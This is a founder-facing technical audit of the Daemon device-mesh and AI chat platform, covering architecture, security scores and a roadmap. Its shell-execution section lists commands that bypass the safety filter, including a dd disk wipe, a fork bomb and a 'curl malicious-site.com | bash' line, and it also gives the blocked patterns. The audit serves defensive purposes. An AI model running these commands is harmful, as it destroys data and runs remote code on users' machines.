# DAEMON WAR ROOM: Technical Reality Report

**Date:** April 5, 2026
**For:** Arthur (founder), from a full codebase audit
**Purpose:** So you can supervise, make architecture decisions, and present Daemon credibly

---

## How to Read This Document

Every technical term is explained immediately when first used. Analogies are provided for every concept. If something is broken or faked, it says so. No sugarcoating.

---

# PART 1: WHAT IS ACTUALLY BUILT (The Map)

## 1.1 The Server (arturito)

**What it is:** A physical computer sitting in your house running Ubuntu Linux (a free operating system, like Windows but for servers). Its name on the network is "arturito" and its internal address is 100.124.245.114 via Tailscale (a tool that creates a private network between your devices, like a secret phone network only your devices are on).

**Analogy:** Think of it as the central switchboard in an old telephone office. Every call goes through it. Every device connects to it. Every conversation is stored on it.

**What it does right now:** Runs the Daemon website, the device connection server, the database, and the AI model routing. It also runs several other unrelated services (Immich photo server, a Windows VM, Guacamole remote desktop) which share the same hardware.

**What it depends on:**
- Power and internet at your house
- Cloudflare (for external access)
- Docker (for Qdrant and sandboxes)

**What breaks if it goes down:** Everything. There is no backup server. No failover. No redundancy. If arturito loses power at 3am, every Daemon user sees a blank page until you physically restart it or power comes back.

**Security: 3/5** -- The machine itself is well-maintained (Ubuntu with updates), but it runs many services under your user account. Any process running as "arthur" can read any other process's data. The server is not exposed directly to the internet (good), but internally it's a shared-everything environment.

---

## 1.2 Cloudflare Tunnel

**What it is:** A secure, encrypted passageway from the public internet to your house. Instead of opening a hole in your firewall (like leaving your front door open), Cloudflare Tunnel works from the inside out -- your server reaches out to Cloudflare and says "send me the traffic for daemon.page."

**Analogy:** Imagine a bank vault with a single armored tube connecting it to the outside world. The tube was built from inside the vault, so nobody on the outside can see where the vault is or how to get in except through the tube.

**What it does right now:** Routes all traffic for `daemon.page`, `my.daemon.page`, and `*.daemon.page` (wildcard subdomains -- meaning any name like `luna.daemon.page`) to port 4800 on arturito, which is the proxy (described next).

**What it depends on:** Cloudflare's infrastructure (massive, global, 99.99%+ uptime historically). Also depends on your internet connection staying up.

**What breaks if it goes down:** All external access dies. But if you're on the same local network as arturito (or connected via Tailscale), you can still access everything directly at `100.124.245.114:4800`. This is an important fallback.

**Security: 5/5** -- Cloudflare encrypts everything with TLS 1.3 (the same encryption your bank uses). They also provide DDoS protection (defense against someone flooding your server with traffic to take it down) and hide your home IP address from the public.

---

## 1.3 The Proxy (proxy.js)

**What it is:** A 70-line JavaScript program that acts as a traffic cop for incoming connections.

**Analogy:** Like a receptionist in a building lobby. Someone walks in and says "I'm here for the website" -- receptionist sends them to floor 4802 (Next.js). Someone else says "I need the device connection line" -- receptionist sends them to floor 4801 (WebSocket server). "Voice call?" -- floor 4803.

**What it does right now:** Listens on port 4800 (the single port Cloudflare connects to) and routes traffic:
- Regular web page requests go to port 4802 (the Next.js web app)
- WebSocket connections (persistent two-way connections, explained below) starting with `/ws/voice` go to port 4803 (voice server)
- Other WebSocket connections starting with `/ws` go to port 4801 (device server)

**What it depends on:** Node.js (the JavaScript runtime -- think of it as the engine that runs JavaScript outside a browser). Also depends on the three servers it routes to being alive.

**What breaks if it crashes:** ALL traffic stops. No website, no device connections, no voice. However, the systemd service (a Linux process manager, like a babysitter for programs) will automatically restart it within 5 seconds.

**Security: 3/5** -- The proxy itself is simple and does no authentication. It's just a dumb pipe. The security happens at the services it routes to. One concern: it has no rate limiting (it doesn't limit how many requests someone can make per second), which means someone could potentially flood it.

---

## 1.4 Next.js Web App

**What it is:** The website that users see at daemon.page. Built with React (a popular JavaScript library for building user interfaces, made by Meta) running inside Next.js (a framework -- think of it as a pre-built structure that handles the boring parts of making a website, like routing between pages, server-side rendering, and API endpoints).

**Analogy:** React is like LEGO bricks for building web interfaces. Next.js is the instruction manual that tells you how to assemble them into a real building, complete with plumbing (server APIs) and electricity (data loading).

**What it does right now:**
- Landing page at daemon.page with signup/login
- Subdomain-based public daemon pages (luna.daemon.page shows Luna's daemon)
- Chat interface at /chat with conversation threads
- Project sidebar for organizing code projects
- Settings page with API key management
- Google Sign-In integration
- SSE streaming (Server-Sent Events -- a way for the server to push updates to the browser in real-time, like a one-way radio)

**What it depends on:** Node.js, the SQLite database, the Python server module (for user authentication -- the web app actually spawns a Python process to check logins, which is unusual).

**Security: 3/5** -- Authentication uses httpOnly cookies (the browser can't read them via JavaScript, which prevents some attacks) with the `secure` flag (only sent over HTTPS). Session tokens are set to live for 30 days via cookie maxAge, but the sessions table in the database has no expiration column -- meaning if someone steals a token, it works forever until manually deleted.

---

## 1.5 WebSocket Server (ws-server.js)

**What it is:** A persistent, always-on connection server for devices. 

**The HTTP vs WebSocket difference:** Normal web browsing uses HTTP, which works like sending letters -- you send a request, wait, get a response, connection closes. WebSocket is like a phone call -- you dial once, the line stays open, and both sides can talk whenever they want without re-dialing. This is essential for real-time features like clipboard sync, device commands, and heartbeat monitoring.

**Analogy:** Imagine a military radio network. Each device (your phone, laptop, etc.) has a radio tuned to HQ (the server). HQ can send commands at any time. Devices report their status every 15 seconds (heartbeat). If HQ doesn't hear from a device for 25 seconds, it assumes the device is dead and drops the connection.

**What it does right now:**
- Accepts device connections on port 4801 at the path `/ws/device`
- Authenticates devices using device tokens (hashed with SHA-256 -- a one-way mathematical function that turns the token into a fixed-length string, like a fingerprint)
- Maintains a Map (an in-memory dictionary) of all connected devices
- Routes commands from the web UI to specific devices and waits for responses (30-second timeout)
- Broadcasts clipboard changes to all other connected devices
- Tracks connection statistics (latency, heartbeat count, reconnections)
- Provides a health check endpoint at `/health` that shows all connected devices
- Enforces basic user isolation -- a user can only send commands to their own devices

**What it depends on:** Node.js, the SQLite database (for token validation), and a stable network.

**What breaks if it crashes:** All device connections drop instantly. Clipboard sync stops. Device commands fail. However, all device bridges (the software running on each device) have automatic reconnection with exponential backoff (they try again in 1s, then 2s, then 4s, up to 60s max). In practice, devices reconnect within 1-15 seconds.

**Critical design issue:** The `devices` Map is a global, in-memory data structure. This means:
1. If the server restarts, ALL device connection state is lost (devices must re-register)
2. ALL users' devices share the same Map -- there's basic user ID checking (line 118), but the architecture doesn't enforce strict isolation
3. You can never run two instances of this server (for load balancing or redundancy) because they'd each have their own Map with different devices

**Security: 2-3/5** -- Token validation is solid (SHA-256 hashed, checked against DB). But the device-to-command pipeline has gaps: once a device is connected and authenticated, it can receive ANY command type, including `run_command` which executes arbitrary shell commands. The fuzzy device ID matching (lines 108-113) is also concerning -- it matches partial strings, meaning a crafted device ID could potentially target a different device.

---

## 1.6 SQLite Database

**What it is:** A single file on disk (`/home/arthur/daemon/data/users.db`, currently about 1-2MB) that stores ALL user data. Unlike most databases that run as a separate server process (like PostgreSQL or MySQL), SQLite is just a library that reads and writes directly to a file.

**Analogy:** Imagine all your business records -- customer accounts, conversations, billing, device registrations -- all stored in a single Excel spreadsheet file on one computer. It's simple and fast, but if that file gets corrupted or the disk dies, everything is gone.

**What's in it (tables):**

| Table | What it stores | Row count |
|-------|---------------|-----------|
| `users` | Email, hashed password, daemon name, settings | 3 |
| `sessions` | Login tokens (no expiration!) | unknown |
| `projects` | Code projects with git info, paths, domains | 17 |
| `chat_threads` | Conversation threads linked to projects | unknown |
| `chat_messages` | Individual messages in threads | 19,060 |
| `device_tokens` | Hashed tokens for paired devices | 0 (none paired yet!) |
| `conversation_memory` | AI-generated summaries of conversations | unknown |
| `usage_log` | Token usage and costs per API call | unknown |
| `subscriptions` | Billing plan, Stripe/Coinbase IDs, credit balance | 0 (empty) |
| `credit_usage` | Per-API-call billing records | unknown |
| `imported_sessions` | Claude Code sessions imported into daemon | unknown |

**Key facts:**
- Uses WAL mode (Write-Ahead Logging -- a technique where changes are written to a separate file first, reducing the chance of corruption if the process crashes mid-write)
- Daily backups run at 3:00 AM via cron (a built-in Linux scheduler), keeping the last 30 backups. Currently 3 backup files exist.
- The Python server code AND the Node.js web app BOTH access this same file simultaneously. SQLite handles this via file-level locking, but under heavy load with many users, this will become a bottleneck.

**Security: 2/5** -- The database file is not encrypted. Anyone who can log into arturito as the "arthur" user (or any process running as arthur) can read every user's password hash, every conversation, every API key stored in settings. Passwords ARE properly hashed (good), but everything else is plaintext.

**When to worry:** The moment you have more than ~50 concurrent users writing data (chatting, commanding devices simultaneously), SQLite will start showing "database is locked" errors. This is the #1 scaling bottleneck.

---

## 1.7 Qdrant Vector Database

**What it is:** A specialized database for "semantic search" -- finding things by meaning rather than exact keywords.

**How embeddings work (the core concept):** When you feed text to an AI model, it can convert that text into a list of numbers (a "vector" or "embedding"). These numbers capture the meaning of the text. Two pieces of text with similar meanings will produce similar number lists. "How to fix SSH connection" and "terminal login not working" would be close together in this number space, even though they share almost no words.

**Analogy:** Imagine converting every conversation into GPS coordinates on a map. Similar topics cluster together geographically. When you ask "find conversations about network problems," the system finds your GPS coordinate for that question and looks for the nearest conversations on the map.

**What it does right now:** Runs in a Docker container (a lightweight, isolated environment -- like a virtual computer inside your computer, but more efficient) named `qdrant-daemon` on ports 6333-6334. It stores embeddings generated from conversation history so the daemon can recall relevant past conversations.

**What it depends on:** Docker Engine running on arturito.

**What breaks if it stops:** Memory/semantic search breaks. The chat system continues to work normally -- you just lose the ability to search conversations by meaning. It degrades gracefully.

**Current state -- honest assessment:** The Qdrant container is running and healthy. The embedding pipeline exists in `/home/arthur/daemon/server/embed_conversations.py`. However, embeddings need to be actively generated and stored -- it's unclear how consistently this happens. The memory system works for summarization (the `conversation_memory` table) but the vector search may not be fully populated for all conversations.

**Security: 3/5** -- Qdrant is only accessible on localhost (not exposed to the internet), which is good. But it has no authentication configured, meaning any process on arturito can query or modify the vector data.

---

## 1.8 The AI Model Router

**What it is:** A system that decides which AI model processes your message, based on your account tier and what kind of request it is.

**Analogy:** Like a hospital triage system. Someone comes in with a papercut -- they see the nurse (Qwen, free). Someone has a broken arm -- they see the doctor (DeepSeek, affordable). Someone needs brain surgery -- they get the head surgeon (Claude Opus, expensive).

**The three tiers:**

| Tier | Model | Provider | Cost to Daemon | Quality | Speed |
|------|-------|----------|---------------|---------|-------|
| Free | Qwen3-Coder | OpenRouter (a service that provides access to many AI models through one connection) | $0 (subsidized by Alibaba) | Good for basic tasks | Fast |
| Mid | DeepSeek V3.2 | DeepSeek direct API | ~$0.14-0.28 per million tokens | Very good | Fast |
| Premium | Claude Opus | Local Claude CLI (your Max subscription) | $0 marginal (covered by subscription) | Best available | Slower |

**How it actually works:**
- Free/mid tier: Makes a standard API call (sends the message to an external server, gets a response back). Uses the "OpenAI-compatible" format, which is an industry standard -- like USB for AI APIs.
- Premium tier: Spawns the actual `claude` command-line program on arturito, which uses your personal Claude Max subscription. This is clever but fragile -- it's shelling out to a CLI tool rather than calling an API.

**What BYOK means:** "Bring Your Own Key." Users can paste their own API keys into settings (for OpenAI, Anthropic, Google, etc.) and the system will use those instead of daemon's keys. This means the user pays their own API costs directly. The settings page lets users verify their keys work.

**What it depends on:** 
- OpenRouter API (for free tier) -- requires OPENROUTER_API_KEY in vault.env
- DeepSeek API (for mid tier) -- requires DEEPSEEK_API_KEY in vault.env
- Claude CLI installed on arturito (for premium tier) -- requires Arthur's Max subscription active
- Internet connectivity to reach external APIs

**Security: 2-3/5** -- API keys are loaded from environment variables (set via vault.env through the systemd service). User-provided BYOK keys are stored in the SQLite `users.settings` JSON column, unencrypted. If someone gains access to the database, they get every user's API keys.

---

## 1.9 Device Bridge (daemon.mjs / Android service / Tauri app)

**What it is:** Software that runs ON each device (phone, laptop, etc.) and maintains a permanent connection back to the server.

**Three implementations exist:**

| Platform | Implementation | Language | Maturity |
|----------|---------------|----------|----------|
| Linux/Mac/Windows (CLI) | `daemon.mjs` | Node.js (JavaScript) | Most complete |
| Windows/Mac/Linux (Desktop) | Tauri app | Rust + WebView | Built, less tested |
| Android | Native app | Kotlin + Jetpack Compose | Built, functional |

**Analogy:** Each device bridge is like a field agent in a spy network. They check in with HQ (the server) regularly, can receive orders (commands), report their status (heartbeat), and share intelligence (clipboard contents). If they lose contact, they keep trying to reconnect with increasing wait times (1s, 2s, 4s... up to 60s).

**What the CLI bridge can do:**
- Execute any shell command on the device and return the result
- Read files (up to 1MB)
- Write/receive files (saved to ~/Downloads)
- List directory contents (up to 200 entries)
- Read and write the system clipboard
- Detect if Claude CLI is installed and run it locally
- Auto-update itself from the server (checks every 6 hours)
- Install itself as a system service (systemd on Linux, LaunchAgent on macOS)

**What the Tauri desktop app can do:**
- Same shell command execution (via PowerShell on Windows, sh on Unix)
- Same file operations
- Clipboard access
- System information reporting
- Runs as a native desktop window with system tray

**What the Android app can do:**
- Chat UI via WebView (embedded browser)
- Voice companion mode
- Background service for persistent WebSocket connection
- Boot receiver (auto-starts when phone turns on)
- Permission gate for required Android permissions

**Clipboard sync -- the reality:**
- Windows to others: WORKS (reads via PowerShell `Get-Clipboard`)
- Linux to others: WORKS (reads via `xclip` or `xsel`)
- Mac to others: WORKS (reads via `pbpaste`)
- Android to others: DOES NOT WORK for reading (Android restricts clipboard access for background apps since Android 10). Writing TO Android clipboard works fine.
- The CLI polls the clipboard every 1.5 seconds. This is slightly wasteful but simple.

**Security: 2/5** -- This is the biggest security concern in the entire system. Once a device is connected with a valid token, the server can send it ANY shell command and it will execute it without restriction. The `run_command` handler in daemon.mjs (line 211) just passes the command directly to `exec()`. There is no allowlist, no sandboxing, no user confirmation. The safety-check.ts file on the server side catches some obvious destructive commands (rm -rf, DROP TABLE, etc.) via pattern matching (explained below), but this is trivially bypassable.

---

## 1.10 The Pairing System

**What it is:** A mechanism to link a new device to a user account using a short-lived code.

**Analogy:** Like Bluetooth pairing, but over the internet. You go to daemon.page on your laptop, click "Link Device," get a 6-character code like "XK7M2P." You type that code into the daemon app on your phone. The phone sends the code to the server, the server checks it matches, creates a permanent token for the phone, and deletes the code.

**How it works technically:**
1. User clicks "Link Device" in the web UI (must be logged in)
2. Server generates a 6-character code from the set `ABCDEFGHJKMNPQRSTUVWXYZ23456789` (no 0/O, 1/I/L to avoid confusion)
3. Code is stored in memory (not database) with the user's ID and a 5-minute expiration
4. User enters the code on their device (via `daemon pair XK7M2P`)
5. Device sends the code + its device info to `/api/pair` with action "claim"
6. Server validates the code, creates a device token, hashes it with SHA-256, stores the hash in the database
7. Returns the raw token to the device, which saves it locally in `~/.daemon/config.json`
8. Code is deleted (one-time use)
9. Device uses the token for all future connections

**Security: 3-4/5** -- The pairing mechanism itself is well-designed:
- Codes are short-lived (5 minutes)
- One-time use (deleted after claim)
- Ambiguous characters removed
- Code space is 29^6 = ~594 million possibilities (hard to guess in 5 minutes)
- Tokens are SHA-256 hashed before storage

**One weakness:** Pairing codes are stored in memory, not in the database. If the server restarts while someone is mid-pairing, the code is lost. Minor issue in practice.

---

## 1.11 The Agent Loop & Sandbox

**What it is:** A system that gives the free and mid-tier AI models the ability to use tools (run commands, read/write files, search code). Premium tier uses Claude CLI directly, which has its own built-in tool system.

**How the agent loop works:**
1. User sends a message that looks like it needs tools (detected by a regex pattern -- a text-matching formula)
2. The AI model is called with a list of available tools (bash, read_file, write_file, list_files, search)
3. If the model responds with a tool call, the system executes it inside a Docker container
4. The result is sent back to the model, which can make more tool calls or respond to the user
5. This loops until the model gives a final text response

**The Docker sandbox:** For free/mid tier tool execution, a Docker container image called `daemon-sandbox:latest` exists (775MB). This isolates tool execution so users can't damage the main system. Sandboxes are per-user and auto-cleaned after 30 minutes of inactivity.

**Analogy:** Imagine giving someone a calculator that can also run programs, but they're working inside a sealed room (the sandbox). They can do whatever they want inside the room, but they can't touch anything outside it. If they make a mess, you just throw away the room and make a new one.

**What's real vs. aspirational:** The sandbox Docker image exists and is built. The agent loop code is written. Whether it's been thoroughly tested with real users is uncertain -- there are 0 device tokens in the database and only 3 user accounts (two test accounts and Arthur's).

---

# PART 2: SECURITY AUDIT

Each component rated 1-5:
- **5** = Mathematically proven secure (like HTTPS encryption itself)
- **4** = Industry standard, well-tested approach
- **3** = Reasonable for an early startup, known weaknesses documented
- **2** = Functional but a skilled attacker could break it
- **1** = Insecure, needs fixing before any real users

### Transport Security (data moving between devices and server)

**Score: 4/5**

All traffic passes through Cloudflare's TLS 1.3 encryption -- the same encryption that protects online banking. WebSocket connections are upgraded to WSS (the secure version). Data in transit cannot be read by eavesdroppers. The only gap: traffic between Cloudflare and arturito travels through the Cloudflare Tunnel, which is also encrypted, so there's no "last mile" weakness.

### Authentication (proving who you are)

**Score: 2-3/5**

- Passwords are hashed before storage (good)
- Session tokens are stored in httpOnly, secure cookies (good)
- Tokens are set via cookie `maxAge` of 30 days, but the `sessions` database table has NO expiration column -- tokens are valid until manually deleted
- No two-factor authentication (2FA) -- no option for SMS codes, authenticator apps, etc.
- No account lockout after failed login attempts -- someone could try passwords forever
- The Google OAuth integration adds a stronger path (Google handles the password security)
- Arthur's account (`tutucamara@gmail.com`) is hardcoded to always get premium tier (line 110 of chat route.ts) -- not a security issue per se, but hardcoded privileges are fragile

### Device Token Security

**Score: 3/5**

- Tokens are generated as random strings and hashed with SHA-256 before storage (good -- even if someone steals the database, they can't reverse the hashes to get the raw tokens)
- Tokens have a `revoked` field but no expiration date -- a token works forever unless explicitly revoked
- No token rotation (periodically issuing new tokens and invalidating old ones)
- Tokens are stored in plaintext in `~/.daemon/config.json` on each device -- anyone with access to that file can impersonate the device

### Shell Command Execution

**Score: 2/5 -- THIS IS THE HIGHEST-RISK AREA**

Anyone with a valid device token can execute ANY command on the paired device. The safety check system (safety-check.ts) is a pattern-matching filter that catches obvious destructive commands:

**What it catches:**
- `rm -rf`, `rm -f` (file deletion)
- `del /s`, `rd /s`, `Remove-Item -Recurse` (Windows deletion)
- `git reset --hard`, `git push --force`, `git clean` (git destruction)
- `DROP TABLE`, `DROP DATABASE`, `TRUNCATE`, `DELETE FROM` without WHERE (database destruction)
- `systemctl stop`, `kill -9`, `taskkill /f` (process killing)
- Package removal (`npm uninstall`, `pip uninstall`, `apt remove`)

**What it DOESN'T catch (examples of easy bypasses):**
- `find . -delete` (deletes files without using `rm`)
- `dd if=/dev/zero of=/dev/sda` (wipes a disk)
- `chmod -R 000 /` (makes everything unreadable)
- `:(){ :|:& };:` (fork bomb -- crashes the system)
- `curl malicious-site.com | bash` (downloads and runs arbitrary code)
- `python -c "import shutil; shutil.rmtree('/')"` (deletion via Python)
- Any command encoded in base64 or hex

The safety bot is a speed bump, not a wall. It will stop accidental destruction but not intentional malice.

**For the premium tier, it's even more open:** The Claude CLI is invoked with `--dangerously-skip-permissions`, which tells Claude to run any tool without asking for confirmation. This is necessary for the automated agent to work, but it means Claude can and will run any command on arturito.

### Data at Rest (stored data)

**Score: 2/5**

- SQLite database file is unencrypted on disk
- No filesystem-level encryption on the data directory
- Backups are also unencrypted
- User API keys (BYOK) stored as plaintext JSON in the users table
- Server API keys stored in vault.env (chmod 600 -- only readable by arthur, which is appropriate)
- Anyone who gains SSH access to arturito can read everything

### The Safety Bot

**Score: 2/5**

As detailed above, it's pattern-matching against known dangerous commands. It's like having a security guard who was taught to stop people carrying visible guns, but who can't detect concealed weapons. It provides a basic safety net for accidental mistakes but offers no protection against intentional misuse.

---

# PART 3: WHAT NEEDS TO CHANGE BEFORE PRODUCTION

## Critical (must fix before real users)

1. **Token expiration** -- Currently, both session tokens and device tokens live forever. Add an `expires_at` column to both tables, and enforce it on every request. Industry standard: session tokens expire in 24h-30 days with refresh; device tokens expire in 90 days with auto-renewal.

2. **Rate limiting** -- No rate limits exist anywhere. Someone could:
   - Make thousands of API calls per second (running up your AI costs)
   - Attempt millions of password guesses (brute force)
   - Flood the WebSocket server with connections
   - Hit the pairing endpoint trying every possible code
   Add rate limiting at the proxy level (e.g., 60 requests/minute per IP for auth, 10 requests/second for chat).

3. **Input sanitization** -- The system trusts input from devices. The `run_command` handler passes user-provided strings directly to shell execution. At minimum: refuse to execute commands containing shell metacharacters from untrusted sources, or use a proper sandboxing system.

4. **Multi-user isolation** -- The WebSocket server stores all devices in one global Map. While there's a user ID check, the architecture doesn't enforce strict boundaries. Device commands should be strictly scoped: a user should NEVER be able to even see another user's device IDs. Move from a global Map to per-user device maps.

5. **Error handling** -- Many code paths silently swallow errors (empty `catch {}` blocks throughout the codebase). This means bugs hide. When something breaks, you won't know what or why. At minimum, log all errors with context.

## Important (should fix for reliability)

6. **Move from SQLite to PostgreSQL** -- PostgreSQL is a full database server (rather than a single file). It handles multiple simultaneous writers, supports replication (keeping copies on multiple servers), has proper transaction isolation, and doesn't lock the entire database for writes. Target: before you reach 100 users.

7. **Proper logging and monitoring** -- Currently, logs go to systemd journal (accessible via `journalctl`). Add structured logging (JSON format with timestamps, request IDs, user IDs) and a monitoring dashboard. You need to know: how many active users, API cost this hour, error rate, device connection count.

8. **Health checks with alerting** -- The `/health` endpoint exists on the WS server but nobody is watching it. Set up a cron job or external service (like UptimeRobot, free tier) to ping `https://daemon.page` and `https://my.daemon.page/ws/health` every minute, and send you a Telegram message if they're down.

9. **Automated deployment** -- Currently, deploying a new version means: SSH to arturito, git pull, npm run build, sudo systemctl restart daemon-web. This should be automated via GitHub Actions (a free CI/CD service -- "Continuous Integration / Continuous Deployment" -- that runs tasks when you push code).

## Nice to Have (differentiators)

10. **End-to-end encryption for clipboard sync** -- Currently, clipboard contents pass through the server in plaintext. With E2E encryption, the server would relay encrypted blobs that only the user's devices can decrypt. This is a strong privacy selling point.

11. **Zero-knowledge architecture** -- The server shouldn't be able to read user data at all. This requires encrypting all data with keys derived from the user's password, which the server never stores. Complex but valuable for trust.

---

# PART 4: WHAT'S REAL vs. WHAT'S DEMO

An honest accounting of every feature:

| Feature | Status | Reality |
|---------|--------|---------|
| Landing page (daemon.page) | REAL | Works, looks polished, signup/login functional |
| Google Sign-In | REAL | Functional with OAuth flow |
| Subdomain pages (name.daemon.page) | REAL | Wildcard DNS and routing work |
| Chat with AI (free tier, Qwen) | REAL | Works via OpenRouter API |
| Chat with AI (mid tier, DeepSeek) | REAL | Works via DeepSeek API |
| Chat with AI (premium, Claude) | FRAGILE | Depends on Arthur's local Claude CLI and Max subscription. If the subscription lapses or Claude CLI updates break something, premium tier dies. Not scalable to other users. |
| Project sidebar | PARTIAL | Projects can be created and listed. Many features (git integration, deployment, domain management) are stored in DB columns but the UI for managing them is basic. |
| Conversation memory/summarization | REAL | The `conversation_memory` table stores AI-generated summaries. The summarization code runs. |
| Semantic search (memory by meaning) | PARTIAL | Qdrant is running, embedding code exists, but it's unclear if all conversations are fully indexed. May return incomplete results. |
| Device pairing | REAL | Code generation and claiming mechanism is complete and well-designed. However, 0 devices have been paired (the device_tokens table is empty). |
| Clipboard sync | PARTIAL | Works between Windows, Linux, and Mac. Does NOT work for reading from Android (OS restriction). Writing to Android works. |
| Shell command execution on devices | REAL (but dangerous) | Works on all platforms. No restrictions on what commands can be run. |
| File transfer | REAL | Via WebSocket, files are base64-encoded and sent. Size limit in practice ~10MB (WebSocket message size). |
| Billing/subscriptions | BUILT BUT NOT CONNECTED | Stripe checkout and Coinbase Commerce code is written. The subscription table exists. But there are 0 subscriptions, the webhook handlers may not be configured in Stripe's dashboard, and no user has ever been charged. |
| Credit system | BUILT BUT UNUSED | Usage logging, cost calculation, credit balance tracking -- all the code exists. But the `credit_balance_usd` defaults to $5.00 and nothing deducts from it in practice. |
| API marketplace (BYOK) | PARTIAL | The settings page shows fields for multiple API keys. Users can enter and verify keys. But the router only actually uses OpenRouter, DeepSeek, and Claude CLI -- other keys (OpenAI, Google, etc.) are stored but not routed to. |
| Auto-update (CLI) | BUILT BUT UNTESTED | The CLI checks `my.daemon.page/cli/version.json` every 6 hours and self-updates. Whether this endpoint actually serves version info is unverified. |
| Agent loop (tool use for free/mid tier) | BUILT | Docker sandbox image exists (775MB). Agent loop code is written. Testing status uncertain. |
| Safety bot | REAL BUT WEAK | Pattern matching catches obvious destructive commands. Easy to bypass with alternative syntax. |
| Voice companion | BUILT, STATUS UNCLEAR | Voice server routes exist, Android voice screen exists, Python voice code exists in server/. |
| Desktop app (Tauri) | BUILT, NOT DISTRIBUTED | Rust/Tauri code compiles. Not packaged for distribution. Not in any app store or download page. |
| Android app | BUILT | APK builds. Has chat, voice, background service, boot receiver. Not in Play Store. |
| Notifications (Android) | REAL | Native Android notifications implemented |
| Notifications (Desktop/Web) | NOT BUILT | No notification system on non-Android platforms |
| Settings page - API connections | DEMO | Shows all API providers but connections are not wired for user-specific routing beyond the 3 tiers |

---

# PART 5: THE ROADMAP

## v0 -- Ship NOW (What makes Daemon useful to 10 people)

**Keep and harden:**
- Device mesh (connect phone + laptop + server)
- Chat with AI (Qwen free tier is genuinely good enough for basic use)
- Projects (the organizational layer)
- Clipboard sync (killer feature -- people will use this daily)
- Device pairing (already well-designed)

**Remove or hide:**
- Billing/credits system (premature -- no paying customers, adds complexity and attack surface)
- API marketplace UI (confusing when most providers aren't wired up)
- Credit balance display (misleading when nothing actually costs credits)
- Voice companion (not ready for others)

**Harden:**
- Add token expiration (24h sessions, 90-day device tokens)
- Add rate limiting (at proxy level)
- Fix command execution safety (at minimum: require user confirmation for commands on devices, add a command allowlist mode)
- Strict multi-user device isolation in ws-server.js
- Remove the hardcoded Arthur=premium check and replace with a proper admin flag

**Estimated effort:** 1-2 weeks of focused work.

## v1 -- After 100 users

- **PostgreSQL migration** -- Write a migration script that reads SQLite and writes to PostgreSQL. Change the connection code. This is a weekend project once you commit to it.
- **Proper deployment pipeline** -- GitHub Actions that builds, tests, and deploys on push to main.
- **Billing activation** -- Stripe webhooks configured, tested end-to-end, with a real test charge.
- **iOS thin client** -- A lightweight iOS app (or Progressive Web App -- a website that behaves like an app) for clipboard sync and device commands.
- **Monitoring dashboard** -- Grafana or similar, showing active users, API costs, error rates, device connections.

**Estimated timeline:** 2-3 months after v0 launch.

## v2 -- After 1,000 users

- **Multi-server architecture** -- Move from arturito to cloud hosting (Railway or Fly.io). Run multiple instances behind a load balancer. Use Redis (a fast in-memory database) for the device Map instead of in-process memory.
- **End-to-end encryption** -- Clipboard sync and file transfer encrypted client-to-client.
- **Plugin/integration system** -- Let users connect their daemon to external services (Google Calendar, Notion, etc.)
- **Proper BYOK routing** -- Actually route to user-specified API keys for any provider, not just the 3 built-in tiers.

**Estimated timeline:** 6-12 months after v1.

## v3 -- Product-market fit

- **Enterprise features** -- Team workspaces, admin controls, audit logs, SSO (Single Sign-On -- logging in with your company credentials)
- **Team collaboration** -- Shared projects, shared device access with granular permissions
- **Custom model fine-tuning** -- Train models on user's data (requires significant infrastructure)
- **App store** -- Third-party developers building integrations

---

# PART 6: ALTERNATIVES MAP

| What | We Use | Alternatives | Why This Choice | When to Switch |
|------|--------|-------------|-----------------|----------------|
| **Server hosting** | Ubuntu on home machine (free) | AWS EC2 ($20-100/mo), Railway ($5-20/mo), Fly.io ($5-20/mo), Hetzner ($5-10/mo) | Free, full control, fast iteration | When uptime matters (>10 users). Hetzner is the best value for dedicated hardware. |
| **Tunnel/CDN** | Cloudflare Tunnel (free) | ngrok ($8/mo), Tailscale Funnel (free, limited), direct port forwarding (free, insecure) | Free, reliable, includes DDoS protection and SSL | Probably never -- Cloudflare is the best option at any scale |
| **Database** | SQLite (free, zero config) | PostgreSQL (free, industry standard), MySQL (free), PlanetScale (serverless MySQL), Turso (serverless SQLite) | Simplest possible, no separate server needed | PostgreSQL when >100 users or need replication. Turso is interesting for SQLite-compatible scaling. |
| **Web framework** | Next.js (React) | SvelteKit, Nuxt (Vue), Remix, plain Express | Largest ecosystem, SSR works, React is most-hired skill | Probably never -- switching costs are high and it works fine |
| **Device connection** | WebSocket via Cloudflare | Tailscale direct P2P, WireGuard, WebRTC, MQTT | Zero config for end users, works through any firewall/NAT | Consider WebRTC for large file transfers (peer-to-peer, server doesn't relay data). MQTT if you go IoT-heavy. |
| **AI routing** | OpenRouter + DeepSeek + Claude CLI | LiteLLM (unified proxy), custom gateway, Portkey | Flexibility, OpenRouter's free models are a real differentiator | LiteLLM if you add many providers. Custom gateway for cost control at scale. |
| **Vector DB** | Qdrant (self-hosted, free) | Pinecone (managed, $70+/mo), Weaviate (self-hosted), pgvector (PostgreSQL extension) | Self-hosted, good API, production-grade | pgvector if you switch to PostgreSQL (one fewer service to run) |
| **Desktop app** | Tauri (Rust + system WebView) | Electron (Chrome + Node.js, 200MB+), Flutter Desktop, native per-platform | Tiny binary (5-15MB vs 200MB for Electron), cross-platform | Electron if WebView causes rendering inconsistencies. Native if performance demands it. |
| **Mobile app** | Android native (Kotlin) + WebView for chat | React Native, Flutter, Capacitor (web wrapper), PWA | Native gives full device access (boot receiver, background service, clipboard) | Flutter if you want iOS parity without maintaining two native codebases |
| **Payments** | Stripe + Coinbase Commerce | Paddle (handles EU VAT), Lemon Squeezy (similar), Gumroad | Stripe is the standard, Coinbase adds crypto | Paddle or Lemon Squeezy for EU tax compliance if >50% of users are European |
| **Process manager** | systemd (built into Linux) | PM2 (Node.js process manager), Docker Compose, Kubernetes | Already there, reliable, auto-restart works | Docker Compose for multi-service management. Never Kubernetes unless you have 10,000+ users. |
| **Auth** | Custom (bcrypt + session tokens) | NextAuth.js, Clerk ($25/mo), Auth0 ($23/mo), Lucia | Full control, no vendor dependency | Clerk or Auth0 if you want 2FA, magic links, SSO without building them yourself |

---

# PART 7: DEPENDENCY MAP (Chain of Failure)

Read this top-to-bottom. If something on the left breaks, everything indented under it also breaks.

```
INTERNET CONNECTION (your ISP)
  |
  +-- Cloudflare Tunnel
  |     |
  |     +-- ALL external access (daemon.page, my.daemon.page, *.daemon.page)
  |           |
  |           +-- proxy.js (port 4800) -- systemd auto-restarts in 5s
  |                 |
  |                 +-- Next.js (port 4802) -- web UI, auth, chat API, billing
  |                 |     |
  |                 |     +-- Python server modules -- called via execFile for auth
  |                 |     +-- SQLite database -- all user data
  |                 |     +-- OpenRouter API -- free tier chat
  |                 |     +-- DeepSeek API -- mid tier chat
